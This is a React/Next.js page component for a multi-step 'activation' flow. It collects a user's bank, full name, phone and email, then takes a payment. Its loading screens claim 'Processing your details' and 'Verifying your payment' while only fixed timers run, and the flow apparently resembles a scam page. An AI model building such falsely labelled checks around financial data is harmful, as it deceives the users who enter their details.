"use client"

import { useState } from "react"
import { WelcomeScreen } from "@/components/welcome-screen"
import { LoadingScreen } from "@/components/loading-screen"
import { ActivationHeader } from "@/components/activation-header"
import { StepOneForm } from "@/components/step-one-form"
import { StepTwoPayment } from "@/components/step-two-payment"
import { StepThreeSuccess } from "@/components/step-three-success"

interface UserData {
  bank: string
  rpc: string
  fullName: string
  phone: string
  email: string
}

type AppState = 
  | "welcome" 
  | "loading-to-step1" 
  | "step1" 
  | "loading-to-step2" 
  | "step2" 
  | "loading-to-step3" 
  | "step3"

export default function ActivationPage() {
  const [appState, setAppState] = useState<AppState>("welcome")
  const [userData, setUserData] = useState<UserData>({
    bank: "",
    rpc: "",
    fullName: "",
    phone: "",
    email: "",
  })

  const getCurrentStep = () => {
    if (appState === "welcome" || appState === "loading-to-step1" || appState === "step1") return 1
    if (appState === "loading-to-step2" || appState === "step2") return 2
    return 3
  }

  const handleBegin = () => {
    setAppState("loading-to-step1")
    setTimeout(() => {
      setAppState("step1")
    }, 5000)
  }

  const handleStepOneSubmit = (data: UserData) => {
    setUserData(data)
    setAppState("loading-to-step2")
    setTimeout(() => {
      setAppState("step2")
    }, 5000)
  }

  const handleStepTwoSubmit = () => {
    setAppState("loading-to-step3")
    setTimeout(() => {
      setAppState("step3")
    }, 6000)
  }

  const handleBack = () => {
    if (appState === "step2") {
      setAppState("step1")
    }
  }

  // Welcome Screen
  if (appState === "welcome") {
    return <WelcomeScreen onBegin={handleBegin} />
  }

  // Loading States
  if (appState === "loading-to-step1") {
    return <LoadingScreen message="Preparing your activation..." />
  }

  if (appState === "loading-to-step2") {
    return <LoadingScreen message="Processing your details..." />
  }

  if (appState === "loading-to-step3") {
    return <LoadingScreen message="Verifying your payment..." />
  }

  // Step Pages
  return (
    <main className="min-h-screen bg-background">
      <div className="max-w-md mx-auto px-4 py-8">
        <div className="space-y-8">
          <ActivationHeader
            currentStep={getCurrentStep()}
            onBack={handleBack}
            showBackButton={appState === "step2"}
          />

          <div className="transition-all duration-300 ease-in-out">
            {appState === "step1" && (
              <div className="animate-in fade-in slide-in-from-right-4 duration-300">
                <StepOneForm onSubmit={handleStepOneSubmit} />
              </div>
            )}

            {appState === "step2" && (
              <div className="animate-in fade-in slide-in-from-right-4 duration-300">
                <StepTwoPayment onSubmit={handleStepTwoSubmit} />
              </div>
            )}

            {appState === "step3" && (
              <div className="animate-in fade-in slide-in-from-right-4 duration-300">
                <StepThreeSuccess details={userData} />
              </div>
            )}
          </div>
        </div>
      </div>
    </main>
  )
}
